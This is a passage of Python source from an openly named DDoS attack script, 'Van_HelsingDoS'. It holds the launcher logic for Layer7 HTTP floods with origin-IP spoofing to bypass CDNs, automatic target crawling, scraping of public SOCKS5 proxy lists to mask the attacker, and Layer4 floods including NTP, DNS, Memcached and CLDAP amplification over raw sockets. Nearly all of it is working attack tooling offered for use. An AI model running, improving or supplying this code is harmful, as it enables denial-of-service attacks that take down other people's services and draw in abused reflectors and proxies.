            for _ in range(self._rpc):
                Tools.send(s, post_payload)
        except Exception as e:
            err = str(e)
            if "timed out" in err or "Timeout" in err:
                 # print(f"[DEBUG] XMLRPC: Connection Timeout (Target Lagging/Down)")
                 pass
            elif "refused" in err or "Reset" in err:
                pass
            else:
                pass
        Tools.safe_close(s)


class ProxyManager:

    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
                providrs))
        proxes: Set[Proxy] = set()

        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download, provider,
                    ProxyType.stringToProxyType(str(provider["type"])))
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
            (provider["url"], proxy_type.name, provider["timeout"]))
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, exceptions.ConnectionError,
                      exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(
                        data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')
        return proxes


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = f"{gethostname()}@MHTools:~#"

        while 1:
            cmd = input(cons + " ").strip()
            if not cmd: continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)

            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(ToolsConsole.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue

            if {cmd} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                exit(-1)

            if cmd == "CLEAR":
                print("\033c")
                continue

            if not {cmd} & ToolsConsole.METHODS:
                print(f"{cmd} command not found")
                continue

            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)

                    while True:
                        sleep(1)

                        od = ld
                        ld = net_io_counters(pernic=False)

                        t = [(last - now) for now, last in zip(od, ld)]

                        logger.info(
                            ("Bytes Sent %s\n"
                             "Bytes Received %s\n"
                             "Packets Sent %s\n"
                             "Packets Received %s\n"
                             "ErrIn %s\n"
                             "ErrOut %s\n"
                             "DropIn %s\n"
                             "DropOut %s\n"
                             "Cpu Usage %s\n"
                             "Memory %s\n") %
                            (Tools.humanbytes(t[0]), Tools.humanbytes(t[1]),
                             Tools.humanformat(t[2]), Tools.humanformat(t[3]),
                             t[4], t[5], t[6], t[7], str(cpu_percent()) + "%",
                             str(virtual_memory().percent) + "%"))
            if cmd in ["CFIP", "DNS"]:
                print("Soon")
                continue

            if cmd == "CHECK":
                while True:
                    with suppress(Exception):
                        domain = input(f'{cons}give-me-ipaddress# ')
                        if not domain: continue
                        if domain.upper() == "BACK": break
                        if domain.upper() == "CLEAR":
                            print("\033c")
                            continue
                        if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                            exit(-1)
                        if "/" not in domain: continue
                        logger.info("please wait ...")

                        with get(domain, timeout=20) as r:
                            logger.info(('status_code: %d\n'
                                         'status: %s') %
                                        (r.status_code, "ONLINE"
                                        if r.status_code <= 500 else "OFFLINE"))

            if cmd == "INFO":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.info(domain)

                    if not info["success"]:
                        print("Error!")
                        continue

                    logger.info(("Country: %s\n"
                                 "City: %s\n"
                                 "Org: %s\n"
                                 "Isp: %s\n"
                                 "Region: %s\n") %
                                (info["country"], info["city"], info["org"],
                                 info["isp"], info["region"]))

            if cmd == "TSSRV":
                while True:
                    domain = input(f'{cons}give-me-domain# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.ts_srv(domain)
                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")

            if cmd == "PING":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)

                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]

                    logger.info("please wait ...")
                    r = ping(domain, count=5, interval=0.2)
                    logger.info(('Address: %s\n'
                                 'Ping: %d\n'
                                 'Aceepted Packets: %d/%d\n'
                                 'status: %s\n') %
                                (r.address, r.avg_rtt, r.packets_received,
                                 r.packets_sent,
                                 "ONLINE" if r.is_alive else "OFFLINE"))

    @staticmethod
    def stop():
        print('All Attacks has been Stopped !')
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def usage():
        print((
                  '* Van_HelsingDoS - DDoS Attack Script With %d Methods\n'
                  'Note: If the Proxy list is empty, The attack will run without proxies\n'
                  '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                  '      Proxy Type 0 = All in config.json\n'
                  '      SocksTypes:\n'
                  '         - 6 = RANDOM\n'
                  '         - 5 = SOCKS5\n'
                  '         - 4 = SOCKS4\n'
                  '         - 1 = HTTP\n'
                  '         - 0 = ALL\n'
                  ' > Methods:\n'
                  ' - Layer4\n'
                  ' | %s | %d Methods\n'
                  ' - Layer7\n'
                  ' | %s | %d Methods\n'
                  ' - Tools\n'
                  ' | %s | %d Methods\n'
                  ' - Others\n'
                  ' | %s | %d Methods\n'
                  ' - All %d Methods\n'
                  '\n'
                  'Example:\n'
                  '   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
                  '   L4: python3 %s <method> <ip:port> <threads> <duration>\n'
                  '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
                  '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
                  ' Amplification)>\n') %
              (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               ", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
               ", ".join(Methods.LAYER7_METHODS), len(Methods.LAYER7_METHODS),
               ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
               ", ".join(["TOOLS", "HELP", "STOP"]), 3,
               len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               argv[0], argv[0], argv[0], argv[0]))

    # noinspection PyBroadException
    @staticmethod
    def ts_srv(domain):
        records = ['_ts3._udp.', '_tsdns._tcp.']
        DnsResolver = resolver.Resolver()
        DnsResolver.timeout = 1
        DnsResolver.lifetime = 1
        Info = {}
        for rec in records:
            try:
                srv_records = resolver.resolve(rec + domain, 'SRV')
                for srv in srv_records:
                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(
                        srv.port)
            except:
                Info[rec] = 'Not found'

        return Info

    # noinspection PyUnreachableCode
    @staticmethod
    def info(domain):
        with suppress(Exception), get(f"https://ipwhois.app/json/{domain}/") as s:
            return s.json()
        return {"success": False}


def handleProxyList(con, proxy_li, proxy_ty, url=None):
    # [OPTIMIZED] Logic to Handle "No Proxy" Mode
    # If user passed '0' or 'None' as filename, we return None (Direct Attack)
    if str(proxy_li) in {"0", "None", "NONE", "none"}:
        return None

    if proxy_ty not in {4, 5, 1, 0, 6}:
        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
    if not proxy_li.exists():
        logger.warning(
            f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
            logger.info(
                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
            )
            Proxies = ProxyChecker.checkAll(
                Proxies, timeout=5, threads=threads,
                url=url.human_repr() if url else "http://httpbin.org/get",
            )

            if not Proxies:
                exit(
                    "Proxy Check failed, Your network may be the problem"
                    " | The target may not be available."
                )
            stringBuilder = ""
            for proxy in Proxies:
                stringBuilder += (proxy.__str__() + "\n")
            wr.write(stringBuilder)

    # [OPTIMIZED] ULTRA-HARDCORE PROXY LOADER (Van Helsing Edition)
    proxies = []
    if proxy_li.exists():
        with proxy_li.open("r") as f:
            lines = [line.strip() for line in f.read().splitlines() if line.strip()]
            for line in lines:
                try:
                    # Format: user:pass@host:port
                    if "@" in line:
                        auth, endpoint = line.split("@")
                        user, password = auth.split(":")
                        host, port = endpoint.split(":")
                        # Force Create Proxy Object
                        proxies.append(Proxy(host, int(port), ProxyType.SOCKS5, user, password))
                    else:
                        # Fallback for IP:PORT
                        parts = line.split(":")
                        proxies.append(Proxy(parts[0], int(parts[1]), ProxyType.SOCKS5))
                except Exception:
                    pass

    if proxies:
        logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
        logger.info(f"{bcolors.OKGREEN}Proxy Loaded Successfully via Hard-Bypass!{bcolors.RESET}")
    else:
        # [OPTIMIZED] AUTO-FAILOVER: SCAVENGER MODE
        logger.warning(f"{bcolors.FAIL}Primary Proxy File Failed or Empty! Activating Scavenger Mode...{bcolors.RESET}")
        logger.info(f"{bcolors.WARNING}Downloading Fresh Proxies from Public Sources...{bcolors.RESET}")
        
        # Fresh Sources (ULTIMATE COLLECTION - 16 SOURCES)
        sources = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/Zloi-User/hideip.me/main/socks5.txt",
            "https://raw.githubusercontent.com/ManuGM/proxy-365/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/tuanminpay/live-proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks5",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks5/global/socks5_checked.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
            "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/Jakee8718/Free-Proxies/main/socks5/socks5.txt",
            "https://raw.githubusercontent.com/UrielChaves/File-Proxy/master/Socks5.txt"
        ]
        
        scavenged_proxies = []
        for source in sources:
            try:
                # logger.debug(f"Fetching from: {source}") # Silent fetch to reduce spam
                with get(source, timeout=10) as r:
                    if r.status_code == 200:
                        lines = r.text.splitlines()
                        for line in lines:
                            if ":" in line:
                                try:
                                    parts = line.strip().split(":")
                                    scavenged_proxies.append(Proxy(parts[0], int(parts[1]), ProxyType.SOCKS5))
                                except: pass
            except Exception:
                continue

        # Remove duplicates
        proxies = list(set(scavenged_proxies))
        
        if proxies:
            logger.info(f"{bcolors.OKCYAN}Scavenged {len(proxies):,} proxies. Now Checking for Live ones... (This takes time){bcolors.RESET}")
            # [OPTIMIZED] Verify Scavenged Proxies
            proxies = list(ProxyChecker.checkAll(
                set(proxies), timeout=2, threads=min(1000, len(proxies)),
                url="http://www.google.com" # Check against a reliable target
            ))
            logger.info(f"{bcolors.OKGREEN}Scavenged & Verified {len(proxies):,} Live Proxies!{bcolors.RESET}")
        else:
            logger.info(f"{bcolors.FAIL}Scavenger Failed. Running Direct Attack (DANGEROUS).{bcolors.RESET}")
            proxies = None

    return proxies


if __name__ == '__main__':
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                ToolsConsole.runConsole()
            if one == "STOP":
                ToolsConsole.stop()

            method = one
            host = None
            port = None
            url = None
            event = Event()
            event.clear()
            target = None
            urlraw = argv[2].strip()
            if not urlraw.startswith("http"):
                urlraw = "http://" + urlraw

            if method not in Methods.ALL_METHODS:
                exit("Method Not Found %s" %
                     ", ".join(Methods.ALL_METHODS))

            if method in Methods.LAYER7_METHODS:
                # [NEW] Host Header Spoofing / Origin IP Attack
                # Syntax: https://domain.com@1.2.3.4
                origin_ip = None
                if "@" in urlraw:
                    parts = urlraw.split("@")
                    urlraw = parts[0]
                    origin_ip = parts[1].strip()
                    logger.info(f"{bcolors.OKGREEN}Host Spoofing Detected! Target Domain: {urlraw} -> Origin IP: {origin_ip}{bcolors.RESET}")

                url = URL(urlraw)
                host = url.host

                if method != "TOR":
                    try:
                        if origin_ip:
                            host = origin_ip
                        else:
                            host = gethostbyname(url.host)
                    except Exception as e:
                        exit('Cannot resolve hostname ', url.host, str(e))

                threads = int(argv[4])
                rpc = int(argv[6])
                timer = int(argv[7])
                proxy_ty = int(argv[3].strip())
                # [OPTIMIZED] Flexible Path L7
                user_path = argv[5].strip()
                
                # Check for Direct Attack Mode
                if user_path in {"0", "None", "NONE", "none"}:
                    proxy_li = Path("0") # Sentinel value
                else:
                    proxy_li = Path(user_path)
                    if not proxy_li.exists():
                        proxy_li = Path(__dir__ / "files/proxies/" / user_path)
                useragent_li = Path(__dir__ / "files/useragent.txt")
                referers_li = Path(__dir__ / "files/referers.txt")
                bombardier_path = Path.home() / "go/bin/bombardier"
                proxies: Any = set()

                if method == "BOMB":
                    assert (
                            bombardier_path.exists()
                            or bombardier_path.with_suffix('.exe').exists()
                    ), (
                        "Install bombardier: "
                        "https://github.com/raynaldoanantawijaya/Van_HelsingDoS/wiki/BOMB-method"
                    )

                if len(argv) == 9:
                    logger.setLevel("DEBUG")

                if not useragent_li.exists():
                    exit("The Useragent file doesn't exist ")
                if not referers_li.exists():
                    exit("The Referer file doesn't exist ")

                uagents = set(a.strip()
                              for a in useragent_li.open("r+").readlines())
                referers = set(a.strip()
                               for a in referers_li.open("r+").readlines())

                if not uagents: exit("Empty Useragent File ")
                if not referers: exit("Empty Referer File ")

                if threads > 1000:
                    logger.warning("Thread is higher than 1000")
                if rpc > 100:
                    logger.warning(
                        "RPC (Request Pre Connection) is higher than 100")
                
                # [NEW] Active Reconnaissance Phase
                logger.info(f"{bcolors.OKCYAN}Active Recon: Crawling target for valid paths...{bcolors.RESET}")
                discovered_paths = Tools.crawl(urlraw)
                
                if discovered_paths:
                   logger.info(f"{bcolors.OKGREEN}Recon Success! Found {len(discovered_paths)} unique paths.{bcolors.RESET}")
                else:
                   logger.warning(f"{bcolors.WARNING}Recon: No paths found or crawl blocked. Falling back to simple paths.{bcolors.RESET}")

                proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                for thread_id in range(threads):
                    flood = HttpFlood(thread_id, url, host, method, rpc, event,
                                      uagents, referers, proxies)
                    # Inject crawled paths
                    flood.crawled_paths = discovered_paths
                    flood.start()

            if method in Methods.LAYER4_METHODS:
                target = URL(urlraw)

                port = target.port
                target = target.host

                try:
                    target = gethostbyname(target)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)

                if port > 65535 or port < 1:
                    exit("Invalid Port [Min: 1 / Max: 65535] ")

                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
                        not ToolsConsole.checkRawSocket():
                    exit("Cannot Create Raw Socket")

                if method in Methods.LAYER4_AMP:
                    logger.warning("this method need spoofable servers please check")
                    logger.warning("https://github.com/raynaldoanantawijaya/Van_HelsingDoS/wiki/Amplification-ddos-attack")

                threads = int(argv[3])
                timer = int(argv[4])
                proxies = None
                ref = None

                if not port:
                    logger.warning("Port Not Selected, Set To Default: 80")
                    port = 80

                if method in {"SYN", "ICMP"}:
                    __ip__ = __ip__

                if len(argv) >= 6:
                    argfive = argv[5].strip()
                    if argfive:
                        refl_li = Path(__dir__ / "files" / argfive)
                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                            if not refl_li.exists():
                                exit("The reflector file doesn't exist")
                            if len(argv) == 7:
                                logger.setLevel("DEBUG")
                            ref = set(a.strip()
                                      for a in Tools.IP.findall(refl_li.open("r").read()))
                            if not ref: exit("Empty Reflector File ")

                        elif argfive.isdigit() and len(argv) >= 7:
                            if len(argv) == 8:
                                logger.setLevel("DEBUG")
                            proxy_ty = int(argfive)
                            # [OPTIMIZED] Flexible Path
                            user_path = argv[6].strip()
                            proxy_li = Path(user_path)
                            if not proxy_li.exists():
                                proxy_li = Path(__dir__ / "files/proxies" / user_path)
                            proxies = handleProxyList(con, proxy_li, proxy_ty)
                            if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                                exit("this method cannot use for layer4 proxy")

                        else:
                            logger.setLevel("DEBUG")
                
                protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
                
                if method == "MCBOT":
                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                        Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
                        Tools.send(s, Minecraft.data(b'\x00'))

                        protocolid = Tools.protocolRex.search(str(s.recv(1024)))
                        protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
                        
                        if 47 < protocolid > 758:
                            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]

                for _ in range(threads):
                    Layer4((target, port), ref, method, event,
                           proxies, protocolid).start()

            logger.info(
                f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
                % (target or url.host, method, timer, threads))
            event.set()
            ts = time()
            while time() < ts + timer:
                # [PHASE 2] Visual PPS & BPS Stats
                print(
                    f'\r{bcolors.WARNING}Target:{bcolors.OKBLUE} {target or url.host}{bcolors.WARNING} | Speed:{bcolors.OKGREEN} {Tools.human_format(int(REQUESTS_SENT), "PPS")}{bcolors.WARNING} | Data:{bcolors.OKBLUE} {Tools.human_format(int(BYTES_SEND), "Bps")}{bcolors.WARNING} | Progress: {bcolors.OKCYAN}{round((time() - ts) / timer * 100, 2)}%{bcolors.RESET}', end="")
                REQUESTS_SENT.set(0)
                BYTES_SEND.set(0)
                sleep(1)
            print("\n")

            event.clear()
            exit()

        ToolsConsole.usage()
